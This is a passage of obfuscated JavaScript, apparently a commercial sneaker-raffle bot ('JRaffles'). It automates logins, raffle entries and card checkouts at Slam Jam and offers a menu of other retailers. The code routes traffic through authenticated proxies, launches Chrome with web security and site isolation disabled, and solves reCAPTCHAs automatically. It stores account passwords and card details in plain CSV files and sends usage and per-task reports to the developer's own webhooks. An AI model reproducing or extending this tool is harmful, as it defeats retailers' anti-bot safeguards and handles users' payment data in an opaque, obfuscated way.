                            'args': [
                                '--proxy-server=' + _0x37d730[0x0] + ':' + _0x37d730[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x40515f = await _0x1f87e4['newPage']();
                            await _0x40515f['authenticate']({
                                'username': '' + _0x37d730[0x2],
                                'password': '' + _0x37d730[0x3]
                            }), await _0x40515f['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x40515f['setRequestInterception'](!![]), _0x40515f['on']('request', _0x54d722 => {
                                _0x54d722['resourceType']() === 'image' || _0x54d722['resourceType']() === 'font' || _0x54d722['resourceType']() === 'media' ? _0x54d722['abort']() : _0x54d722['continue']();
                            }), await _0x40515f['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x40515f['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x40515f['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x28bb81(0x258), await _0x40515f['waitForSelector']('#CustomerEmail'), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x40515f['type']('#CustomerEmail', '' + _0x429256[_0x31bce5]['Email']), await _0x28bb81(0x12c), await _0x40515f['type']('#CustomerPassword', '' + _0x429256[_0x31bce5]['Password']), await _0x28bb81(0x226), await _0x40515f['$eval']('#customer_login', _0x5d53ff => _0x5d53ff['submit']()), await _0x28bb81(0x7d0), await _0x40515f['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20' + _0x2367c9['cyan']('Solving\x20Captcha')), await _0x40515f['solveRecaptchas'](), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x40515f['$eval']('.shopify-challenge__container\x20>\x20form', _0x257903 => _0x257903['submit']());
                            try {
                                await _0x40515f['waitForSelector']('.nav-account'), await _0x28bb81(0x4b0);
                            } catch {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x40515f['goto']('' + _0x429256[_0x31bce5]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x28bb81(0xbb8), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x40515f['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x40515f['click']('.product-select-variant-wrapper'), await _0x28bb81(0x320), await _0x40515f['click']('li.product-select-variant__value[data-size=\x22' + _0x429256[_0x31bce5]['Size'] + '\x22]'), await _0x28bb81(0x384), await _0x40515f['$eval']('#AddToCartForm-product-template-raffle', _0x2d2fbc => _0x2d2fbc['submit']()), await _0x40515f['waitForSelector']('.cart-order-summary__content'), await _0x28bb81(0x514), await _0x40515f['goto']('https://drop.slamjam.com/checkout'), await _0x28bb81(0x514), await _0x40515f['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x40515f['select']('#checkout_shipping_address_country', '' + _0x429256[_0x31bce5]['Country']), await _0x28bb81(0x200), await _0x40515f['waitForSelector']('#checkout_shipping_address_first_name'), await _0x40515f['type']('#checkout_shipping_address_first_name', '' + _0x429256[_0x31bce5]['FirstName']), await _0x28bb81(0x237), await _0x40515f['type']('#checkout_shipping_address_last_name', '' + _0x429256[_0x31bce5]['LastName']), await _0x28bb81(0x1e0), await _0x40515f['type']('#checkout_shipping_address_address1', _0x429256[_0x31bce5]['Address1'] + '\x20' + _0x429256[_0x31bce5]['HouseNumber']), await _0x28bb81(0x514), await _0x40515f['type']('#checkout_shipping_address_address2', '' + _0x429256[_0x31bce5]['Address2']), await _0x28bb81(0x514);
                            _0x429256[_0x31bce5]['Postcode'] == undefined && (_0x429256[_0x31bce5]['Postcode'] = _0x429256[_0x31bce5]['Zip']);
                            await _0x40515f['type']('#checkout_shipping_address_zip', '' + _0x429256[_0x31bce5]['Postcode']), await _0x28bb81(0x2bc), await _0x40515f['type']('#checkout_shipping_address_city', '' + _0x429256[_0x31bce5]['City']), await _0x28bb81(0x320), await _0x40515f['type']('#checkout_shipping_address_phone', '' + _0x429256[_0x31bce5]['Phone']), await _0x28bb81(0x320), await _0x40515f['click']('#continue_button'), await _0x28bb81(0xbb8), await _0x40515f['waitForSelector']('.summary-title'), await _0x28bb81(0x320), await _0x40515f['click']('#continue_button'), await _0x28bb81(0x320), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x40515f['waitForSelector']('#checkout_credit_card_vault'), await _0x28bb81(0x3e8);
                            var _0x105508 = await _0x40515f['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3e6d50 = await _0x105508['contentFrame']();
                            await _0x3e6d50['click']('#number'), await _0x28bb81(0x3e8), await _0x3e6d50['type']('#number', '' + _0x429256[_0x31bce5]['CardNumber'], { 'delay': 0x78 }), _0x105508 = await _0x40515f['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3e6d50 = await _0x105508['contentFrame'](), await _0x28bb81(0x1c2), await _0x3e6d50['click']('#name'), await _0x28bb81(0x1f4), await _0x3e6d50['type']('#name', '' + _0x429256[_0x31bce5]['NameOnCard'], { 'delay': 0x78 }), _0x105508 = await _0x40515f['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3e6d50 = await _0x105508['contentFrame'](), await _0x28bb81(0x1c2), await _0x3e6d50['click']('#expiry'), await _0x28bb81(0x1f4), await _0x3e6d50['type']('#expiry', '' + _0x429256[_0x31bce5]['ExpiryDate'], { 'delay': 0x78 }), _0x105508 = await _0x40515f['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3e6d50 = await _0x105508['contentFrame'](), await _0x28bb81(0x1c2), await _0x3e6d50['click']('#verification_value'), await _0x28bb81(0x1f4), await _0x3e6d50['type']('#verification_value', '' + _0x429256[_0x31bce5]['CVV'], { 'delay': 0x78 }), await _0x40515f['$eval']('#accepts-flag-raffle', _0x5e6022 => _0x5e6022['click']()), await _0x28bb81(0x7d0), console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x40515f['$eval']('#continue_button', _0x6dc0e0 => _0x6dc0e0['click']()), await _0x28bb81(0x1b58), await _0x40515f['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x40515f['$eval']('.edit_checkout.animate-floating-labels', _0x143d3a => _0x143d3a['submit']()), await _0x28bb81(0x7d0);
                            try {
                                await _0x40515f['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x2c75d3 = 'no', _0x4d8543(_0x429256[_0x31bce5], _0x53bf1b), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x160bea) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x160bea['message']);
                            }
                            var _0x254cc7 = await _0xb1aeae(_0x429256[_0x31bce5], _0x53bf1b, 'dev', ![]), _0x1cb754 = await _0xb1aeae(_0x429256[_0x31bce5], _0x53bf1b, 'pub', ![]);
                            const _0x51adf9 = {
                                'succesDEVMSG': { 'embeds': [_0x254cc7] },
                                'succesPUBMSG': { 'embeds': [_0x1cb754] }
                            };
                            try {
                                _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x51adf9['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x51adf9['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x4a9ac0, _0x51adf9['succesPUBMSG']);
                            } catch (_0x5e230a) {
                                console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5e230a));
                            }
                        } catch (_0x1ea48d) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20' + _0x1ea48d)), _0x183d7c = '' + _0x1ea48d;
                            var _0x1fb22b = await _0xb1aeae(kickz[_0x31bce5], _0x53bf1b, 'dev', !![], _0x183d7c);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x1fb22b] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], EMBEDS['errorDEV']), await _0x40545a(_0x2b1b7c, EMBEDS['errorDEV']), _0x2c75d3 = 'yes';
                        } finally {
                            _0x1f87e4 && _0x1f87e4['close']();
                            if (_0x2c75d3 == 'yes' && _0x5a5448 != 0x5 && _0x183d7c != 'Size\x20Not\x20Found') {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Retrying')), _0x31bce5 = _0x31bce5 - 0x1, _0x5a5448 = _0x5a5448 + 0x1;
                                continue;
                            }
                            _0x2c75d3 == 'yes' && _0x5a5448 >= 0x5 && (_0x1322f8(_0x429256[_0x31bce5], _0x53bf1b), _0x2c75d3 = 'no', _0x5a5448 = 0x0), console['log']('Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x385a16) {
                    var _0x51800e = await _0x2cc7eb(), _0x90d5fa = _0x5e446e['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x1defbb = _0x2b479b['parse'](_0x90d5fa, { 'header': !![] })['data'];
                    for (var _0x4ed064 = 0x0; _0x4ed064 < _0x1defbb['length']; _0x4ed064++) {
                        var _0x1b1fa6 = _0x1defbb[_0x4ed064]['Store'], _0x1ad9b0 = _0x1defbb[_0x4ed064]['Mode'];
                        for (var _0xf6dbd4 of _0x57cc5d) {
                            const _0x16209b = _0xf6dbd4['name']['includes'](_0x1b1fa6);
                            if (!_0x16209b)
                                continue;
                            for (mode of _0xf6dbd4['modules']) {
                                if (mode['name'] == _0x1ad9b0) {
                                    console['log']('Running\x20' + _0x2367c9['cyan'](mode['name'])), await mode['function'](mode, [_0x1defbb[_0x4ed064]], _0x51800e);
                                    var _0x458f89 = _0x90d5fa['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x5e446e['writeFileSync']('../failed-tasks.csv', _0x458f89);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x4b6216 = await _0x3ad538['get']('Answer');
                    if (_0x4b6216['Answer']['toLowerCase']() == 'y') {
                        _0x5e446e['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x28bb81(0x3e8);
                        return;
                    }
                    if (_0x4b6216['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x28bb81(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x28bb81(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x82de14(_0x4850e5) {
    var _0x4efdcd = await _0x2cc7eb(), _0x3bbd61 = _0x5e446e['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x2af91b = _0x2b479b['parse'](_0x3bbd61, { 'header': !![] })['data'];
    for (var _0x53e3be = 0x0; _0x53e3be < _0x2af91b['length']; _0x53e3be++) {
        var _0x246554 = _0x2af91b[_0x53e3be]['Store'], _0x170769 = _0x2af91b[_0x53e3be]['Mode'];
        for (var _0x519c6f of _0x57cc5d) {
            const _0x12586a = _0x519c6f['name']['includes'](_0x246554);
            if (_0x12586a)
                for (mode of _0x57cc5d[_0x519c6f]['modules']) {
                    const _0x28fe86 = mode['name']['includes'](_0x170769);
                    _0x28fe86 && (_0x4850e5 = mode['name'], await mode['function'](_0x4850e5, _0x2af91b[_0x53e3be], _0x4efdcd));
                }
        }
    }
}
async function _0x39f948() {
    await _0x518062(), console['clear']();
    if (_0x2de2a3 != 'devkey') {
        let _0x571b43 = await _0x203c12['autoUpdate']();
        if (_0x571b43 === 'yes')
            return _0xfeb634('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2ad114 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x28bb81(0x2710);
        ;
    }
    await _0x4b4482(_0x2ad114);
    if (_0x481743 === ![])
        return console['log']('Closing\x20Browser'), await _0x28bb81(0xbb8);
    else
        try {
            var _0x53a17a = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x340f37
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x2de2a3
                    }
                ]
            }];
            const _0x1ed0a2 = { 'embeds': _0x53a17a };
            var _0x4e92cb = await _0xb1aeae(null, null, 'open', ![]);
            const _0x29f7fd = { 'openDEVMSG': { 'embeds': [_0x4e92cb] } };
            await _0x40545a(_0x568b11, _0x29f7fd['openDEVMSG']);
            async function _0x1da422() {
                _0x50109a('JRaffles\x20' + _0x2de2a3), console['clear'](), console['log']('Welcome\x20to\x20' + _0x2367c9['cyan']('JRaffles();') + '\x20' + _0x2de2a3), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x50ef06 = 0x0; _0x50ef06 < _0x57cc5d['length'] - 0x4; _0x50ef06++) {
                    if (_0x50ef06 >= 0xa) {
                        console['log']('\x20(' + _0x50ef06 + ')\x20[' + _0x57cc5d[_0x50ef06]['name'] + ']');
                        continue;
                    }
                    if (_0x57cc5d[_0x50ef06]['name'] === 'Reload\x20Settings' || _0x57cc5d[_0x50ef06]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x50ef06 + ')\x20\x20[' + _0x57cc5d[_0x50ef06]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x57cc5d['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x57cc5d['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x57cc5d['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x57cc5d['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2f91d3();
                if (taskModule > _0x57cc5d['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x28bb81(0x3e8), _0x1da422();
                if (_0x57cc5d[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                    var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x39e409 = await _0x2cc7eb(), _0x1c0999 = await _0x35ecac();
                        _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x1c0999), await _0x442f0b['function'](_0x442f0b, _0x1c0999, _0x39e409);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x39e409 = await _0x2cc7eb(), _0x1c0999 = await _0x35ecac();
                            _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x1c0999), await _0x442f0b['function'](_0x442f0b, _0x1c0999, _0x39e409);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x39e409 = await _0x2cc7eb();
                                await _0x442f0b['function'](_0x442f0b, links, _0x39e409);
                            }
                        }
                    }
                    return _0x1da422();
                }
                if (_0x57cc5d[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                        var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x39e409 = await _0x2cc7eb(), _0x1bec13 = await _0x35ecac();
                            _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x1bec13), await _0x442f0b['function'](_0x442f0b, _0x1bec13, _0x39e409);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x39e409 = await _0x2cc7eb(), _0x1bec13 = await _0x35ecac();
                                _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x1bec13), await _0x442f0b['function'](_0x442f0b, _0x1bec13, _0x39e409);
                            }
                        }
                    } catch (_0x20bef5) {
                        console['log'](_0x20bef5), await _0x28bb81(0xfa0);
                    }
                    return _0x1da422();
                }
                if (_0x57cc5d[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                    var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x39e409 = await _0x2cc7eb();
                        return await _0x442f0b['function'](_0x442f0b, _0x39e409), _0x1da422();
                    }
                    var _0x39e409 = await _0x2cc7eb(), _0x185634 = await _0x35ecac();
                    return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x185634), await _0x442f0b['function'](_0x442f0b, _0x185634, _0x39e409), _0x1da422();
                }
                if (_0x57cc5d[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                    var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x39e409 = await _0x2cc7eb(), _0x185634 = await _0x35ecac();
                    return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x185634), await _0x442f0b['function'](_0x442f0b, _0x185634, _0x39e409), _0x1da422();
                } else {
                    if (_0x57cc5d[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                        var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x39e409 = await _0x2cc7eb(), _0x8e8a5d = await _0x35ecac();
                            return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x8e8a5d), await _0x442f0b['function'](_0x442f0b, _0x8e8a5d, _0x39e409), _0x1da422();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x39e409 = await _0x2cc7eb();
                                return await _0x442f0b['function'](_0x442f0b, links, _0x39e409), _0x1da422();
                            }
                        }
                        ;
                    } else {
                        if (_0x57cc5d[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                            var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction], _0x39e409 = await _0x2cc7eb(), _0x2ef03c = await _0x35ecac();
                            return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x2ef03c), await _0x442f0b['function'](_0x442f0b, _0x2ef03c, _0x39e409), await _0x28bb81(0x1388), _0x1da422();
                        } else {
                            if (_0x57cc5d[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                                var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x39e409 = await _0x2cc7eb(), _0x8e8a5d = await _0x35ecac();
                                    return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x8e8a5d), await _0x442f0b['function'](_0x442f0b, _0x8e8a5d, _0x39e409), _0x1da422();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x39e409 = await _0x2cc7eb();
                                        return await _0x442f0b['function'](_0x442f0b, links, _0x39e409), _0x1da422();
                                    }
                                }
                                ;
                            } else {
                                if (_0x57cc5d[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                                    var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x5c6129('https://bouncewear.com/nl/account/register', _0x442f0b);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x57cc5d[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                                        var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x39e409 = await _0x2cc7eb(), _0x348ff5 = await _0x35ecac();
                                            return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x348ff5), await _0x442f0b['function'](_0x442f0b, _0x348ff5, _0x39e409), _0x1da422();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x39e409 = await _0x2cc7eb(), _0x348ff5 = await _0x35ecac();
                                                return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x348ff5), await _0x442f0b['function'](_0x442f0b, _0x348ff5, _0x39e409), _0x1da422();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x57cc5d[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                                            var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x39e409 = await _0x2cc7eb(), _0x477c42 = await _0x35ecac();
                                                return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x477c42), await _0x442f0b['function'](_0x442f0b, _0x477c42, _0x39e409), _0x1da422();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x39e409 = await _0x2cc7eb(), _0x477c42 = await _0x35ecac();
                                                    return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x477c42), await _0x442f0b['function'](_0x442f0b, _0x477c42, _0x39e409), _0x1da422();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x57cc5d[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                                                var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x39e409 = await _0x2cc7eb(), _0x192ade = await _0x35ecac();
                                                    return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x192ade), await _0x442f0b['function'](_0x442f0b, _0x192ade, _0x39e409), _0x1da422();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x39e409 = await _0x2cc7eb(), _0x192ade = await _0x35ecac();
                                                        return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x192ade), await _0x442f0b['function'](_0x442f0b, _0x192ade, _0x39e409), _0x1da422();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x57cc5d[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                                                    var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x39e409 = await _0x2cc7eb(), _0x518e33 = await _0x35ecac();
                                                        return _0x37b240['shuffleTasks'] && await _0x30cb5a(_0x518e33), await _0x442f0b['function'](_0x442f0b, _0x518e33, _0x39e409), _0x1da422();
                                                    }
                                                } else {
                                                    if (_0x57cc5d[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x28bb81(0x3e8), _0x1da422();
                                                    else {
                                                        if (_0x57cc5d[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x2dc108 = _0x57cc5d[taskModule]['name'], _0x39e409 = await _0x2cc7eb();
                                                            await _0xb8020d(_0x2dc108, _0x39e409);
                                                        } else {
                                                            if (_0x57cc5d[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x5a66e8(_0x57cc5d[taskModule]['modules']);
                                                                var _0x442f0b = _0x57cc5d[taskModule]['modules'][taskFunction];
                                                                return await _0x442f0b['function'](_0x442f0b), _0x1da422();
                                                            } else {
                                                                if (_0x57cc5d[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x32337c = 0x0;
                                                                    for (const _0x4e5333 in _0x37b240) {
                                                                        console['log']('(' + _0x32337c + ')\x20' + _0x4e5333 + '\x20:\x20' + _0x37b240[_0x4e5333]), _0x32337c++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x32337c + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x24e916 = await _0x242042();
                                                                    if (_0x24e916 == _0x32337c)
                                                                        return _0x1da422();
                                                                    console['clear'];
                                                                    var _0xc01177 = 0x0;
                                                                    for (var _0x3ee2df in _0x37b240) {
                                                                        if (_0x24e916 == _0xc01177) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3ee2df + '\x20:'), _0x37b240[_0x3ee2df] = await _0x1c04f0(), _0x5e446e['writeFileSync']('../settings.json', JSON['stringify'](_0x37b240));
                                                                            break;
                                                                        } else
                                                                            _0xc01177++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x28bb81(0xbb8), _0x1da422();
                                                                } else {
                                                                    if (_0x57cc5d[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x518062(), _0x1da422();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x57cc5d[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x8f0c9e = await _0x14eb79();
                                                                            _0x8f0c9e == 'ModuleVoorDeBoys' ? (await _0x5f377f(), await _0x396bf7(), await afewFunction(_0x581121[_0x59947f], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x28bb81(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x1da422();
        } catch (_0x54fd9e) {
            return console['log'](_0x54fd9e), await _0x28bb81(0x3a98);
        }
}
;
_0x50109a('JRaffles\x20' + _0x2de2a3), _0x518062();
try {
    _0x39f948();
} catch (_0x8b5e1e) {
    var _0x485774 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x340f37
            },
            {
                'name': 'Version',
                'value': '' + _0x2de2a3
            },
            {
                'name': 'Error',
                'value': '' + _0x8b5e1e
            }
        ]
    }];
    const _0x59ceb5 = { 'embeds': _0x485774 };
    _0x40545a(_0x2b1b7c, _0x59ceb5);
}